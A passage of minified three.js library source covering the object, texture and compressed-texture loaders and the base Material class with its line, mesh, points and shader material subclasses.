0!==a.lightMapIntensity&&(b.lightMapIntensity=a.lightMapIntensity);void 0!==a.aoMap&&(b.aoMap=this.getTexture(a.aoMap));void 0!==a.aoMapIntensity&&(b.aoMapIntensity=a.aoMapIntensity);if(void 0!==a.materials)for(var c=0,d=a.materials.length;c<\nd;c++)b.materials.push(this.parse(a.materials[c]));return b}});THREE.ObjectLoader=function(a){this.manager=void 0!==a?a:THREE.DefaultLoadingManager;this.texturePath=\"\"};\nObject.assign(THREE.ObjectLoader.prototype,{load:function(a,b,c,d){\"\"===this.texturePath&&(this.texturePath=a.substring(0,a.lastIndexOf(\"/\")+1));var e=this;(new THREE.XHRLoader(e.manager)).load(a,function(a){e.parse(JSON.parse(a),b)},c,d)},setTexturePath:function(a){this.texturePath=a},setCrossOrigin:function(a){this.crossOrigin=a},parse:function(a,b){var c=this.parseGeometries(a.geometries),d=this.parseImages(a.images,function(){void 0!==b&&b(e)}),d=this.parseTextures(a.textures,d),d=this.parseMaterials(a.materials,\nd),e=this.parseObject(a.object,c,d);a.animations&&(e.animations=this.parseAnimations(a.animations));void 0!==a.images&&0!==a.images.length||void 0===b||b(e);return e},parseGeometries:function(a){var b={};if(void 0!==a)for(var c=new THREE.JSONLoader,d=new THREE.BufferGeometryLoader,e=0,f=a.length;e<f;e++){var g,h=a[e];switch(h.type){case \"PlaneGeometry\":case \"PlaneBufferGeometry\":g=new THREE[h.type](h.width,h.height,h.widthSegments,h.heightSegments);break;case \"BoxGeometry\":case \"BoxBufferGeometry\":case \"CubeGeometry\":g=\nnew THREE[h.type](h.width,h.height,h.depth,h.widthSegments,h.heightSegments,h.depthSegments);break;case \"CircleGeometry\":case \"CircleBufferGeometry\":g=new THREE[h.type](h.radius,h.segments,h.thetaStart,h.thetaLength);break;case \"CylinderGeometry\":case \"CylinderBufferGeometry\":g=new THREE[h.type](h.radiusTop,h.radiusBottom,h.height,h.radialSegments,h.heightSegments,h.openEnded,h.thetaStart,h.thetaLength);break;case \"ConeGeometry\":case \"ConeBufferGeometry\":g=new THREE[h.type](h.radius,h.height,h.radialSegments,\nh.heightSegments,h.openEnded,h.thetaStart,h.thetaLength);break;case \"SphereGeometry\":case \"SphereBufferGeometry\":g=new THREE[h.type](h.radius,h.widthSegments,h.heightSegments,h.phiStart,h.phiLength,h.thetaStart,h.thetaLength);break;case \"DodecahedronGeometry\":case \"IcosahedronGeometry\":case \"OctahedronGeometry\":case \"TetrahedronGeometry\":g=new THREE[h.type](h.radius,h.detail);break;case \"RingGeometry\":case \"RingBufferGeometry\":g=new THREE[h.type](h.innerRadius,h.outerRadius,h.thetaSegments,h.phiSegments,\nh.thetaStart,h.thetaLength);break;case \"TorusGeometry\":case \"TorusBufferGeometry\":g=new THREE[h.type](h.radius,h.tube,h.radialSegments,h.tubularSegments,h.arc);break;case \"TorusKnotGeometry\":case \"TorusKnotBufferGeometry\":g=new THREE[h.type](h.radius,h.tube,h.tubularSegments,h.radialSegments,h.p,h.q);break;case \"LatheGeometry\":case \"LatheBufferGeometry\":g=new THREE[h.type](h.points,h.segments,h.phiStart,h.phiLength);break;case \"BufferGeometry\":g=d.parse(h);break;case \"Geometry\":g=c.parse(h.data,this.texturePath).geometry;\nbreak;default:console.warn('THREE.ObjectLoader: Unsupported geometry type \"'+h.type+'\"');continue}g.uuid=h.uuid;void 0!==h.name&&(g.name=h.name);b[h.uuid]=g}return b},parseMaterials:function(a,b){var c={};if(void 0!==a){var d=new THREE.MaterialLoader;d.setTextures(b);for(var e=0,f=a.length;e<f;e++){var g=d.parse(a[e]);c[g.uuid]=g}}return c},parseAnimations:function(a){for(var b=[],c=0;c<a.length;c++){var d=THREE.AnimationClip.parse(a[c]);b.push(d)}return b},parseImages:function(a,b){function c(a){d.manager.itemStart(a);\nreturn g.load(a,function(){d.manager.itemEnd(a)})}var d=this,e={};if(void 0!==a&&0<a.length){var f=new THREE.LoadingManager(b),g=new THREE.ImageLoader(f);g.setCrossOrigin(this.crossOrigin);for(var f=0,h=a.length;f<h;f++){var k=a[f],l=/^(\\/\\/)|([a-z]+:(\\/\\/)?)/i.test(k.url)?k.url:d.texturePath+k.url;e[k.uuid]=c(l)}}return e},parseTextures:function(a,b){function c(a){if(\"number\"===typeof a)return a;console.warn(\"THREE.ObjectLoader.parseTexture: Constant should be in numeric form.\",a);return THREE[a]}\nvar d={};if(void 0!==a)for(var e=0,f=a.length;e<f;e++){var g=a[e];void 0===g.image&&console.warn('THREE.ObjectLoader: No \"image\" specified for',g.uuid);void 0===b[g.image]&&console.warn(\"THREE.ObjectLoader: Undefined image\",g.image);var h=new THREE.Texture(b[g.image]);h.needsUpdate=!0;h.uuid=g.uuid;void 0!==g.name&&(h.name=g.name);void 0!==g.mapping&&(h.mapping=c(g.mapping));void 0!==g.offset&&(h.offset=new THREE.Vector2(g.offset[0],g.offset[1]));void 0!==g.repeat&&(h.repeat=new THREE.Vector2(g.repeat[0],\ng.repeat[1]));void 0!==g.minFilter&&(h.minFilter=c(g.minFilter));void 0!==g.magFilter&&(h.magFilter=c(g.magFilter));void 0!==g.anisotropy&&(h.anisotropy=g.anisotropy);Array.isArray(g.wrap)&&(h.wrapS=c(g.wrap[0]),h.wrapT=c(g.wrap[1]));d[g.uuid]=h}return d},parseObject:function(){var a=new THREE.Matrix4;return function(b,c,d){function e(a){void 0===c[a]&&console.warn(\"THREE.ObjectLoader: Undefined geometry\",a);return c[a]}function f(a){if(void 0!==a)return void 0===d[a]&&console.warn(\"THREE.ObjectLoader: Undefined material\",\na),d[a]}var g;switch(b.type){case \"Scene\":g=new THREE.Scene;break;case \"PerspectiveCamera\":g=new THREE.PerspectiveCamera(b.fov,b.aspect,b.near,b.far);void 0!==b.focus&&(g.focus=b.focus);void 0!==b.zoom&&(g.zoom=b.zoom);void 0!==b.filmGauge&&(g.filmGauge=b.filmGauge);void 0!==b.filmOffset&&(g.filmOffset=b.filmOffset);void 0!==b.view&&(g.view=Object.assign({},b.view));break;case \"OrthographicCamera\":g=new THREE.OrthographicCamera(b.left,b.right,b.top,b.bottom,b.near,b.far);break;case \"AmbientLight\":g=\nnew THREE.AmbientLight(b.color,b.intensity);break;case \"DirectionalLight\":g=new THREE.DirectionalLight(b.color,b.intensity);break;case \"PointLight\":g=new THREE.PointLight(b.color,b.intensity,b.distance,b.decay);break;case \"SpotLight\":g=new THREE.SpotLight(b.color,b.intensity,b.distance,b.angle,b.penumbra,b.decay);break;case \"HemisphereLight\":g=new THREE.HemisphereLight(b.color,b.groundColor,b.intensity);break;case \"Mesh\":g=e(b.geometry);var h=f(b.material);g=g.bones&&0<g.bones.length?new THREE.SkinnedMesh(g,\nh):new THREE.Mesh(g,h);break;case \"LOD\":g=new THREE.LOD;break;case \"Line\":g=new THREE.Line(e(b.geometry),f(b.material),b.mode);break;case \"PointCloud\":case \"Points\":g=new THREE.Points(e(b.geometry),f(b.material));break;case \"Sprite\":g=new THREE.Sprite(f(b.material));break;case \"Group\":g=new THREE.Group;break;default:g=new THREE.Object3D}g.uuid=b.uuid;void 0!==b.name&&(g.name=b.name);void 0!==b.matrix?(a.fromArray(b.matrix),a.decompose(g.position,g.quaternion,g.scale)):(void 0!==b.position&&g.position.fromArray(b.position),\nvoid 0!==b.rotation&&g.rotation.fromArray(b.rotation),void 0!==b.scale&&g.scale.fromArray(b.scale));void 0!==b.castShadow&&(g.castShadow=b.castShadow);void 0!==b.receiveShadow&&(g.receiveShadow=b.receiveShadow);void 0!==b.visible&&(g.visible=b.visible);void 0!==b.userData&&(g.userData=b.userData);if(void 0!==b.children)for(var k in b.children)g.add(this.parseObject(b.children[k],c,d));if(\"LOD\"===b.type)for(b=b.levels,h=0;h<b.length;h++){var l=b[h];k=g.getObjectByProperty(\"uuid\",l.object);void 0!==\nk&&g.addLevel(k,l.distance)}return g}}()});THREE.TextureLoader=function(a){this.manager=void 0!==a?a:THREE.DefaultLoadingManager};Object.assign(THREE.TextureLoader.prototype,{load:function(a,b,c,d){var e=new THREE.Texture,f=new THREE.ImageLoader(this.manager);f.setCrossOrigin(this.crossOrigin);f.setPath(this.path);f.load(a,function(a){e.image=a;e.needsUpdate=!0;void 0!==b&&b(e)},c,d);return e},setCrossOrigin:function(a){this.crossOrigin=a;return this},setPath:function(a){this.path=a;return this}});\nTHREE.CubeTextureLoader=function(a){this.manager=void 0!==a?a:THREE.DefaultLoadingManager};\nObject.assign(THREE.CubeTextureLoader.prototype,{load:function(a,b,c,d){function e(c){g.load(a[c],function(a){f.images[c]=a;h++;6===h&&(f.needsUpdate=!0,b&&b(f))},void 0,d)}var f=new THREE.CubeTexture,g=new THREE.ImageLoader(this.manager);g.setCrossOrigin(this.crossOrigin);g.setPath(this.path);var h=0;for(c=0;c<a.length;++c)e(c);return f},setCrossOrigin:function(a){this.crossOrigin=a;return this},setPath:function(a){this.path=a;return this}});\nTHREE.DataTextureLoader=THREE.BinaryTextureLoader=function(a){this.manager=void 0!==a?a:THREE.DefaultLoadingManager;this._parser=null};\nObject.assign(THREE.BinaryTextureLoader.prototype,{load:function(a,b,c,d){var e=this,f=new THREE.DataTexture,g=new THREE.XHRLoader(this.manager);g.setResponseType(\"arraybuffer\");g.load(a,function(a){if(a=e._parser(a))void 0!==a.image?f.image=a.image:void 0!==a.data&&(f.image.width=a.width,f.image.height=a.height,f.image.data=a.data),f.wrapS=void 0!==a.wrapS?a.wrapS:THREE.ClampToEdgeWrapping,f.wrapT=void 0!==a.wrapT?a.wrapT:THREE.ClampToEdgeWrapping,f.magFilter=void 0!==a.magFilter?a.magFilter:THREE.LinearFilter,\nf.minFilter=void 0!==a.minFilter?a.minFilter:THREE.LinearMipMapLinearFilter,f.anisotropy=void 0!==a.anisotropy?a.anisotropy:1,void 0!==a.format&&(f.format=a.format),void 0!==a.type&&(f.type=a.type),void 0!==a.mipmaps&&(f.mipmaps=a.mipmaps),1===a.mipmapCount&&(f.minFilter=THREE.LinearFilter),f.needsUpdate=!0,b&&b(f,a)},c,d);return f}});THREE.CompressedTextureLoader=function(a){this.manager=void 0!==a?a:THREE.DefaultLoadingManager;this._parser=null};\nObject.assign(THREE.CompressedTextureLoader.prototype,{load:function(a,b,c,d){function e(e){k.load(a[e],function(a){a=f._parser(a,!0);g[e]={width:a.width,height:a.height,format:a.format,mipmaps:a.mipmaps};l+=1;6===l&&(1===a.mipmapCount&&(h.minFilter=THREE.LinearFilter),h.format=a.format,h.needsUpdate=!0,b&&b(h))},c,d)}var f=this,g=[],h=new THREE.CompressedTexture;h.image=g;var k=new THREE.XHRLoader(this.manager);k.setPath(this.path);k.setResponseType(\"arraybuffer\");if(Array.isArray(a))for(var l=0,\nn=0,p=a.length;n<p;++n)e(n);else k.load(a,function(a){a=f._parser(a,!0);if(a.isCubemap)for(var c=a.mipmaps.length/a.mipmapCount,d=0;d<c;d++){g[d]={mipmaps:[]};for(var e=0;e<a.mipmapCount;e++)g[d].mipmaps.push(a.mipmaps[d*a.mipmapCount+e]),g[d].format=a.format,g[d].width=a.width,g[d].height=a.height}else h.image.width=a.width,h.image.height=a.height,h.mipmaps=a.mipmaps;1===a.mipmapCount&&(h.minFilter=THREE.LinearFilter);h.format=a.format;h.needsUpdate=!0;b&&b(h)},c,d);return h},setPath:function(a){this.path=\na;return this}});\nTHREE.Material=function(){Object.defineProperty(this,\"id\",{value:THREE.MaterialIdCount++});this.uuid=THREE.Math.generateUUID();this.name=\"\";this.type=\"Material\";this.lights=this.fog=!0;this.blending=THREE.NormalBlending;this.side=THREE.FrontSide;this.shading=THREE.SmoothShading;this.vertexColors=THREE.NoColors;this.opacity=1;this.transparent=!1;this.blendSrc=THREE.SrcAlphaFactor;this.blendDst=THREE.OneMinusSrcAlphaFactor;this.blendEquation=THREE.AddEquation;this.blendEquationAlpha=this.blendDstAlpha=\nthis.blendSrcAlpha=null;this.depthFunc=THREE.LessEqualDepth;this.depthWrite=this.depthTest=!0;this.clippingPlanes=null;this.clipShadows=!1;this.colorWrite=!0;this.precision=null;this.polygonOffset=!1;this.alphaTest=this.polygonOffsetUnits=this.polygonOffsetFactor=0;this.premultipliedAlpha=!1;this.overdraw=0;this._needsUpdate=this.visible=!0};\nTHREE.Material.prototype={constructor:THREE.Material,get needsUpdate(){return this._needsUpdate},set needsUpdate(a){!0===a&&this.update();this._needsUpdate=a},setValues:function(a){if(void 0!==a)for(var b in a){var c=a[b];if(void 0===c)console.warn(\"THREE.Material: '\"+b+\"' parameter is undefined.\");else{var d=this[b];void 0===d?console.warn(\"THREE.\"+this.type+\": '\"+b+\"' is not a property of this material.\"):d instanceof THREE.Color?d.set(c):d instanceof THREE.Vector3&&c instanceof THREE.Vector3?d.copy(c):\nthis[b]=\"overdraw\"===b?Number(c):c}}},toJSON:function(a){function b(a){var b=[],c;for(c in a){var d=a[c];delete d.metadata;b.push(d)}return b}var c=void 0===a;c&&(a={textures:{},images:{}});var d={metadata:{version:4.4,type:\"Material\",generator:\"Material.toJSON\"}};d.uuid=this.uuid;d.type=this.type;\"\"!==this.name&&(d.name=this.name);this.color instanceof THREE.Color&&(d.color=this.color.getHex());void 0!==this.roughness&&(d.roughness=this.roughness);void 0!==this.metalness&&(d.metalness=this.metalness);\nthis.emissive instanceof THREE.Color&&(d.emissive=this.emissive.getHex());this.specular instanceof THREE.Color&&(d.specular=this.specular.getHex());void 0!==this.shininess&&(d.shininess=this.shininess);this.map instanceof THREE.Texture&&(d.map=this.map.toJSON(a).uuid);this.alphaMap instanceof THREE.Texture&&(d.alphaMap=this.alphaMap.toJSON(a).uuid);this.lightMap instanceof THREE.Texture&&(d.lightMap=this.lightMap.toJSON(a).uuid);this.bumpMap instanceof THREE.Texture&&(d.bumpMap=this.bumpMap.toJSON(a).uuid,\nd.bumpScale=this.bumpScale);this.normalMap instanceof THREE.Texture&&(d.normalMap=this.normalMap.toJSON(a).uuid,d.normalScale=this.normalScale.toArray());this.displacementMap instanceof THREE.Texture&&(d.displacementMap=this.displacementMap.toJSON(a).uuid,d.displacementScale=this.displacementScale,d.displacementBias=this.displacementBias);this.roughnessMap instanceof THREE.Texture&&(d.roughnessMap=this.roughnessMap.toJSON(a).uuid);this.metalnessMap instanceof THREE.Texture&&(d.metalnessMap=this.metalnessMap.toJSON(a).uuid);\nthis.emissiveMap instanceof THREE.Texture&&(d.emissiveMap=this.emissiveMap.toJSON(a).uuid);this.specularMap instanceof THREE.Texture&&(d.specularMap=this.specularMap.toJSON(a).uuid);this.envMap instanceof THREE.Texture&&(d.envMap=this.envMap.toJSON(a).uuid,d.reflectivity=this.reflectivity);void 0!==this.size&&(d.size=this.size);void 0!==this.sizeAttenuation&&(d.sizeAttenuation=this.sizeAttenuation);this.blending!==THREE.NormalBlending&&(d.blending=this.blending);this.shading!==THREE.SmoothShading&&\n(d.shading=this.shading);this.side!==THREE.FrontSide&&(d.side=this.side);this.vertexColors!==THREE.NoColors&&(d.vertexColors=this.vertexColors);1>this.opacity&&(d.opacity=this.opacity);!0===this.transparent&&(d.transparent=this.transparent);0<this.alphaTest&&(d.alphaTest=this.alphaTest);!0===this.premultipliedAlpha&&(d.premultipliedAlpha=this.premultipliedAlpha);!0===this.wireframe&&(d.wireframe=this.wireframe);1<this.wireframeLinewidth&&(d.wireframeLinewidth=this.wireframeLinewidth);c&&(c=b(a.textures),\na=b(a.images),0<c.length&&(d.textures=c),0<a.length&&(d.images=a));return d},clone:function(){return(new this.constructor).copy(this)},copy:function(a){this.name=a.name;this.fog=a.fog;this.lights=a.lights;this.blending=a.blending;this.side=a.side;this.shading=a.shading;this.vertexColors=a.vertexColors;this.opacity=a.opacity;this.transparent=a.transparent;this.blendSrc=a.blendSrc;this.blendDst=a.blendDst;this.blendEquation=a.blendEquation;this.blendSrcAlpha=a.blendSrcAlpha;this.blendDstAlpha=a.blendDstAlpha;\nthis.blendEquationAlpha=a.blendEquationAlpha;this.depthFunc=a.depthFunc;this.depthTest=a.depthTest;this.depthWrite=a.depthWrite;this.colorWrite=a.colorWrite;this.precision=a.precision;this.polygonOffset=a.polygonOffset;this.polygonOffsetFactor=a.polygonOffsetFactor;this.polygonOffsetUnits=a.polygonOffsetUnits;this.alphaTest=a.alphaTest;this.premultipliedAlpha=a.premultipliedAlpha;this.overdraw=a.overdraw;this.visible=a.visible;this.clipShadows=a.clipShadows;a=a.clippingPlanes;var b=null;if(null!==\na)for(var c=a.length,b=Array(c),d=0;d!==c;++d)b[d]=a[d].clone();this.clippingPlanes=b;return this},update:function(){this.dispatchEvent({type:\"update\"})},dispose:function(){this.dispatchEvent({type:\"dispose\"})}};Object.assign(THREE.Material.prototype,THREE.EventDispatcher.prototype);THREE.MaterialIdCount=0;\nTHREE.LineBasicMaterial=function(a){THREE.Material.call(this);this.type=\"LineBasicMaterial\";this.color=new THREE.Color(16777215);this.linewidth=1;this.linejoin=this.linecap=\"round\";this.lights=!1;this.setValues(a)};THREE.LineBasicMaterial.prototype=Object.create(THREE.Material.prototype);THREE.LineBasicMaterial.prototype.constructor=THREE.LineBasicMaterial;\nTHREE.LineBasicMaterial.prototype.copy=function(a){THREE.Material.prototype.copy.call(this,a);this.color.copy(a.color);this.linewidth=a.linewidth;this.linecap=a.linecap;this.linejoin=a.linejoin;return this};THREE.LineDashedMaterial=function(a){THREE.Material.call(this);this.type=\"LineDashedMaterial\";this.color=new THREE.Color(16777215);this.scale=this.linewidth=1;this.dashSize=3;this.gapSize=1;this.lights=!1;this.setValues(a)};THREE.LineDashedMaterial.prototype=Object.create(THREE.Material.prototype);\nTHREE.LineDashedMaterial.prototype.constructor=THREE.LineDashedMaterial;THREE.LineDashedMaterial.prototype.copy=function(a){THREE.Material.prototype.copy.call(this,a);this.color.copy(a.color);this.linewidth=a.linewidth;this.scale=a.scale;this.dashSize=a.dashSize;this.gapSize=a.gapSize;return this};\nTHREE.MeshBasicMaterial=function(a){THREE.Material.call(this);this.type=\"MeshBasicMaterial\";this.color=new THREE.Color(16777215);this.aoMap=this.map=null;this.aoMapIntensity=1;this.envMap=this.alphaMap=this.specularMap=null;this.combine=THREE.MultiplyOperation;this.reflectivity=1;this.refractionRatio=.98;this.wireframe=!1;this.wireframeLinewidth=1;this.wireframeLinejoin=this.wireframeLinecap=\"round\";this.lights=this.morphTargets=this.skinning=!1;this.setValues(a)};\nTHREE.MeshBasicMaterial.prototype=Object.create(THREE.Material.prototype);THREE.MeshBasicMaterial.prototype.constructor=THREE.MeshBasicMaterial;\nTHREE.MeshBasicMaterial.prototype.copy=function(a){THREE.Material.prototype.copy.call(this,a);this.color.copy(a.color);this.map=a.map;this.aoMap=a.aoMap;this.aoMapIntensity=a.aoMapIntensity;this.specularMap=a.specularMap;this.alphaMap=a.alphaMap;this.envMap=a.envMap;this.combine=a.combine;this.reflectivity=a.reflectivity;this.refractionRatio=a.refractionRatio;this.wireframe=a.wireframe;this.wireframeLinewidth=a.wireframeLinewidth;this.wireframeLinecap=a.wireframeLinecap;this.wireframeLinejoin=a.wireframeLinejoin;\nthis.skinning=a.skinning;this.morphTargets=a.morphTargets;return this};THREE.MeshDepthMaterial=function(a){THREE.Material.call(this);this.type=\"MeshDepthMaterial\";this.depthPacking=THREE.BasicDepthPacking;this.morphTargets=this.skinning=!1;this.displacementMap=this.alphaMap=this.map=null;this.displacementScale=1;this.displacementBias=0;this.wireframe=!1;this.wireframeLinewidth=1;this.lights=this.fog=!1;this.setValues(a)};THREE.MeshDepthMaterial.prototype=Object.create(THREE.Material.prototype);\nTHREE.MeshDepthMaterial.prototype.constructor=THREE.MeshDepthMaterial;THREE.MeshDepthMaterial.prototype.copy=function(a){THREE.Material.prototype.copy.call(this,a);this.depthPacking=a.depthPacking;this.skinning=a.skinning;this.morphTargets=a.morphTargets;this.map=a.map;this.alphaMap=a.alphaMap;this.displacementMap=a.displacementMap;this.displacementScale=a.displacementScale;this.displacementBias=a.displacementBias;this.wireframe=a.wireframe;this.wireframeLinewidth=a.wireframeLinewidth;return this};\nTHREE.MeshLambertMaterial=function(a){THREE.Material.call(this);this.type=\"MeshLambertMaterial\";this.color=new THREE.Color(16777215);this.lightMap=this.map=null;this.lightMapIntensity=1;this.aoMap=null;this.aoMapIntensity=1;this.emissive=new THREE.Color(0);this.emissiveIntensity=1;this.envMap=this.alphaMap=this.specularMap=this.emissiveMap=null;this.combine=THREE.MultiplyOperation;this.reflectivity=1;this.refractionRatio=.98;this.wireframe=!1;this.wireframeLinewidth=1;this.wireframeLinejoin=this.wireframeLinecap=\n\"round\";this.morphNormals=this.morphTargets=this.skinning=!1;this.setValues(a)};THREE.MeshLambertMaterial.prototype=Object.create(THREE.Material.prototype);THREE.MeshLambertMaterial.prototype.constructor=THREE.MeshLambertMaterial;\nTHREE.MeshLambertMaterial.prototype.copy=function(a){THREE.Material.prototype.copy.call(this,a);this.color.copy(a.color);this.map=a.map;this.lightMap=a.lightMap;this.lightMapIntensity=a.lightMapIntensity;this.aoMap=a.aoMap;this.aoMapIntensity=a.aoMapIntensity;this.emissive.copy(a.emissive);this.emissiveMap=a.emissiveMap;this.emissiveIntensity=a.emissiveIntensity;this.specularMap=a.specularMap;this.alphaMap=a.alphaMap;this.envMap=a.envMap;this.combine=a.combine;this.reflectivity=a.reflectivity;this.refractionRatio=\na.refractionRatio;this.wireframe=a.wireframe;this.wireframeLinewidth=a.wireframeLinewidth;this.wireframeLinecap=a.wireframeLinecap;this.wireframeLinejoin=a.wireframeLinejoin;this.skinning=a.skinning;this.morphTargets=a.morphTargets;this.morphNormals=a.morphNormals;return this};THREE.MeshNormalMaterial=function(a){THREE.Material.call(this,a);this.type=\"MeshNormalMaterial\";this.wireframe=!1;this.wireframeLinewidth=1;this.morphTargets=this.lights=this.fog=!1;this.setValues(a)};\nTHREE.MeshNormalMaterial.prototype=Object.create(THREE.Material.prototype);THREE.MeshNormalMaterial.prototype.constructor=THREE.MeshNormalMaterial;THREE.MeshNormalMaterial.prototype.copy=function(a){THREE.Material.prototype.copy.call(this,a);this.wireframe=a.wireframe;this.wireframeLinewidth=a.wireframeLinewidth;return this};\nTHREE.MeshPhongMaterial=function(a){THREE.Material.call(this);this.type=\"MeshPhongMaterial\";this.color=new THREE.Color(16777215);this.specular=new THREE.Color(1118481);this.shininess=30;this.lightMap=this.map=null;this.lightMapIntensity=1;this.aoMap=null;this.aoMapIntensity=1;this.emissive=new THREE.Color(0);this.emissiveIntensity=1;this.bumpMap=this.emissiveMap=null;this.bumpScale=1;this.normalMap=null;this.normalScale=new THREE.Vector2(1,1);this.displacementMap=null;this.displacementScale=1;this.displacementBias=\n0;this.envMap=this.alphaMap=this.specularMap=null;this.combine=THREE.MultiplyOperation;this.reflectivity=1;this.refractionRatio=.98;this.wireframe=!1;this.wireframeLinewidth=1;this.wireframeLinejoin=this.wireframeLinecap=\"round\";this.morphNormals=this.morphTargets=this.skinning=!1;this.setValues(a)};THREE.MeshPhongMaterial.prototype=Object.create(THREE.Material.prototype);THREE.MeshPhongMaterial.prototype.constructor=THREE.MeshPhongMaterial;\nTHREE.MeshPhongMaterial.prototype.copy=function(a){THREE.Material.prototype.copy.call(this,a);this.color.copy(a.color);this.specular.copy(a.specular);this.shininess=a.shininess;this.map=a.map;this.lightMap=a.lightMap;this.lightMapIntensity=a.lightMapIntensity;this.aoMap=a.aoMap;this.aoMapIntensity=a.aoMapIntensity;this.emissive.copy(a.emissive);this.emissiveMap=a.emissiveMap;this.emissiveIntensity=a.emissiveIntensity;this.bumpMap=a.bumpMap;this.bumpScale=a.bumpScale;this.normalMap=a.normalMap;this.normalScale.copy(a.normalScale);\nthis.displacementMap=a.displacementMap;this.displacementScale=a.displacementScale;this.displacementBias=a.displacementBias;this.specularMap=a.specularMap;this.alphaMap=a.alphaMap;this.envMap=a.envMap;this.combine=a.combine;this.reflectivity=a.reflectivity;this.refractionRatio=a.refractionRatio;this.wireframe=a.wireframe;this.wireframeLinewidth=a.wireframeLinewidth;this.wireframeLinecap=a.wireframeLinecap;this.wireframeLinejoin=a.wireframeLinejoin;this.skinning=a.skinning;this.morphTargets=a.morphTargets;\nthis.morphNormals=a.morphNormals;return this};\nTHREE.MeshStandardMaterial=function(a){THREE.Material.call(this);this.defines={STANDARD:\"\"};this.type=\"MeshStandardMaterial\";this.color=new THREE.Color(16777215);this.metalness=this.roughness=.5;this.lightMap=this.map=null;this.lightMapIntensity=1;this.aoMap=null;this.aoMapIntensity=1;this.emissive=new THREE.Color(0);this.emissiveIntensity=1;this.bumpMap=this.emissiveMap=null;this.bumpScale=1;this.normalMap=null;this.normalScale=new THREE.Vector2(1,1);this.displacementMap=null;this.displacementScale=\n1;this.displacementBias=0;this.envMap=this.alphaMap=this.metalnessMap=this.roughnessMap=null;this.envMapIntensity=1;this.refractionRatio=.98;this.wireframe=!1;this.wireframeLinewidth=1;this.wireframeLinejoin=this.wireframeLinecap=\"round\";this.morphNormals=this.morphTargets=this.skinning=!1;this.setValues(a)};THREE.MeshStandardMaterial.prototype=Object.create(THREE.Material.prototype);THREE.MeshStandardMaterial.prototype.constructor=THREE.MeshStandardMaterial;\nTHREE.MeshStandardMaterial.prototype.copy=function(a){THREE.Material.prototype.copy.call(this,a);this.defines={STANDARD:\"\"};this.color.copy(a.color);this.roughness=a.roughness;this.metalness=a.metalness;this.map=a.map;this.lightMap=a.lightMap;this.lightMapIntensity=a.lightMapIntensity;this.aoMap=a.aoMap;this.aoMapIntensity=a.aoMapIntensity;this.emissive.copy(a.emissive);this.emissiveMap=a.emissiveMap;this.emissiveIntensity=a.emissiveIntensity;this.bumpMap=a.bumpMap;this.bumpScale=a.bumpScale;this.normalMap=\na.normalMap;this.normalScale.copy(a.normalScale);this.displacementMap=a.displacementMap;this.displacementScale=a.displacementScale;this.displacementBias=a.displacementBias;this.roughnessMap=a.roughnessMap;this.metalnessMap=a.metalnessMap;this.alphaMap=a.alphaMap;this.envMap=a.envMap;this.envMapIntensity=a.envMapIntensity;this.refractionRatio=a.refractionRatio;this.wireframe=a.wireframe;this.wireframeLinewidth=a.wireframeLinewidth;this.wireframeLinecap=a.wireframeLinecap;this.wireframeLinejoin=a.wireframeLinejoin;\nthis.skinning=a.skinning;this.morphTargets=a.morphTargets;this.morphNormals=a.morphNormals;return this};THREE.MeshPhysicalMaterial=function(a){THREE.MeshStandardMaterial.call(this);this.defines={PHYSICAL:\"\"};this.type=\"MeshPhysicalMaterial\";this.reflectivity=.5;this.clearCoatRoughness=this.clearCoat=0;this.setValues(a)};THREE.MeshPhysicalMaterial.prototype=Object.create(THREE.MeshStandardMaterial.prototype);THREE.MeshPhysicalMaterial.prototype.constructor=THREE.MeshPhysicalMaterial;\nTHREE.MeshPhysicalMaterial.prototype.copy=function(a){THREE.MeshStandardMaterial.prototype.copy.call(this,a);this.defines={PHYSICAL:\"\"};this.reflectivity=a.reflectivity;this.clearCoat=a.clearCoat;this.clearCoatRoughness=a.clearCoatRoughness;return this};THREE.MultiMaterial=function(a){this.uuid=THREE.Math.generateUUID();this.type=\"MultiMaterial\";this.materials=a instanceof Array?a:[];this.visible=!0};\nTHREE.MultiMaterial.prototype={constructor:THREE.MultiMaterial,toJSON:function(a){for(var b={metadata:{version:4.2,type:\"material\",generator:\"MaterialExporter\"},uuid:this.uuid,type:this.type,materials:[]},c=this.materials,d=0,e=c.length;d<e;d++){var f=c[d].toJSON(a);delete f.metadata;b.materials.push(f)}b.visible=this.visible;return b},clone:function(){for(var a=new this.constructor,b=0;b<this.materials.length;b++)a.materials.push(this.materials[b].clone());a.visible=this.visible;return a}};\nTHREE.PointsMaterial=function(a){THREE.Material.call(this);this.type=\"PointsMaterial\";this.color=new THREE.Color(16777215);this.map=null;this.size=1;this.sizeAttenuation=!0;this.lights=!1;this.setValues(a)};THREE.PointsMaterial.prototype=Object.create(THREE.Material.prototype);THREE.PointsMaterial.prototype.constructor=THREE.PointsMaterial;\nTHREE.PointsMaterial.prototype.copy=function(a){THREE.Material.prototype.copy.call(this,a);this.color.copy(a.color);this.map=a.map;this.size=a.size;this.sizeAttenuation=a.sizeAttenuation;return this};\nTHREE.ShaderMaterial=function(a){THREE.Material.call(this);this.type=\"ShaderMaterial\";this.defines={};this.uniforms={};this.vertexShader=\"void main() {\\n\\tgl_Position = projectionMatrix * modelViewMatrix * vec4( position, 1.0 );\\n}\";this.fragmentShader=\"void main() {\\n\\tgl_FragColor = vec4( 1.0, 0.0, 0.0, 1.0 );\\n}\";this.linewidth=1;this.wireframe=!1;this.wireframeLinewidth=1;this.morphNormals=this.morphTargets=this.skinning=this.clipping=this.lights=this.fog=!1;this.extensions={derivatives:!1,fragDepth:!1,\ndrawBuffers:!1,shaderTextureLOD:!1};this.defaultAttributeValues={color:[1,1,1],uv:[0,0],uv2:[0,0]};this.index0AttributeName=void 0;void 0!==a&&(void 0!==a.attributes&&console.error(\"THREE.ShaderMaterial: attributes should now be defined in THREE.BufferGeometry instead.\"),this.setValues(a))};THREE.ShaderMaterial.prototype=Object.create(THREE.Material.prototype);THREE.ShaderMaterial.prototype.constructor=THREE.ShaderMaterial;\nTHREE.ShaderMaterial.prototype.copy=function(a){THREE.Material.prototype.copy.call(this,a);this.fragmentShader=a.fragmentShader;this.vertexShader=a.vertexShader;this.uniforms=THREE.UniformsUtils.clone(a.uniforms);this.defines=a.defines;this.wireframe=a.wireframe;this.wireframeLinewidth=a.wireframeLinewidth;this.lights=a.lights;this.clipping=a.clipping;this.skinning=a.skinning;this.morphTargets=a.morphTargets;this.morphNormals=a.morphNormals;this.extensions=a.extensions;return this};\nTHREE.ShaderMaterial.prototype.toJSON=function(a){a=THREE.Material.prototype.toJSON.call(this,a);a.uniforms=this.uniforms;a.vertexShader=this.vertexShader;a.fragmentShader=this.fragmentShader;return 